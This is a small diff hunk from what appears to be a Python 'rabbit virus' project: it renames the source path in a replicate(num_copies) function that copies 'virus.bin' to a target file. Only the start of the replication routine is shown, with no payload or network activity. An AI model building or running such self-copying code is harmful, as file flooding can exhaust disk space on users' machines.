@@ -73,7 +73,7 @@ from functools import cache
 #CHANGE BELOW CODE TO ADD MORE FUNCTIONS AUR FEATURES....
     
 def replicate(num_copies):
-    file =  "Rabbit Virus/virus.bin" #FILE COPY PATH
+    file =  "RABBIT VIRUS/virus.bin" #FILE COPY PATH
     path = "Virus.txt"#FILE PASTE PATH
     script_dir = os.path.dirname(file)
     script_name = os.path.basename(path)
